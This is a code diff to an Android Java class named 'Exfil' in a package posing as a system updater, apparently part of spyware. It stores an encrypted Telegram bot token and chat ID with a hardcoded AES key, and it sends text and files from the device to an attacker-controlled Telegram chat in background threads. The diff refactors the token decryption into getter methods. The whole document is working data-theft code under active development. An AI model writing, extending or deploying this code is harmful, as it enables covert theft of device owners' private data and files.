@@ -1,7 +1,6 @@
 package com.sys.updater;
 
 import android.util.Base64;
-
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -14,14 +13,19 @@ import javax.crypto.spec.SecretKeySpec;
 
 public class Exfil {
     
-    // L'Token w l'Chat ID m-encryptin (Makhdoum b AES-256)
     private static final String ENC_TOKEN = "GiAyDOTdgj6JrceD11JY4qZzjqbs3OvGCxJPsu+GIeExqfEXcMu0WE9YEr63OdyNwMiuMbVEQ8pwh6dcQJjlzxHq/q7vO9upUQ1C0saW9CZCPBL7iFTsb1no";
     private static final String ENC_CHAT_ID = "hE73YR/q2eyjwkQt3oIa9mxzjwhSz1urMMI9hSWm8aEJDEJmRIKf16ZgPgGpktxWdhpJ7UrX";
-    
-    // L'clé dyal l'decryption (Khassha tkoun 32 byte)
     private static final String SECRET_KEY = "MySecretKey1234567890123456789012"; 
 
-    // Fonction li kat-fok l'chifra f l'memory
+    // Zedna hadou bach TelegramService y9der ystafd mn l'Token m-decrypté
+    public static String getBotToken() {
+        return decrypt(ENC_TOKEN);
+    }
+
+    public static String getChatId() {
+        return decrypt(ENC_CHAT_ID);
+    }
+
     private static String decrypt(String encryptedText) {
         try {
             byte[] keyBytes = SECRET_KEY.getBytes("UTF-8");
@@ -36,19 +40,15 @@ public class Exfil {
         }
     }
 
-    // 1. Send Text
     public static void send(String text) {
         new Thread(() -> {
             try {
-                String botToken = decrypt(ENC_TOKEN);
-                String chatId = decrypt(ENC_CHAT_ID);
-
-                String urlStr = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+                String urlStr = "https://api.telegram.org/bot" + getBotToken() + "/sendMessage";
                 URL url = new URL(urlStr);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
-                String postData = "chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
+                String postData = "chat_id=" + getChatId() + "&text=" + URLEncoder.encode(text, "UTF-8");
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(postData.getBytes());
                 }
@@ -57,14 +57,10 @@ public class Exfil {
         }).start();
     }
     
-    // 2. Send File
     public static void sendFile(String filePath, String type, String caption) {
         new Thread(() -> {
             try {
-                String botToken = decrypt(ENC_TOKEN);
-                String chatId = decrypt(ENC_CHAT_ID);
-
-                String urlStr = "https://api.telegram.org/bot" + botToken + "/send" + type;
+                String urlStr = "https://api.telegram.org/bot" + getBotToken() + "/send" + type;
                 String boundary = "*****";
                 File file = new File(filePath);
                 HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
@@ -73,7 +69,7 @@ public class Exfil {
                 conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
 
                 DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
-                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n");
+                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + getChatId() + "\r\n");
                 if (caption != null && !caption.isEmpty()) {
                     dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
                 }
@@ -93,4 +89,4 @@ public class Exfil {
             } catch (Exception e) { e.printStackTrace(); }
         }).start();
     }
-            }
+}
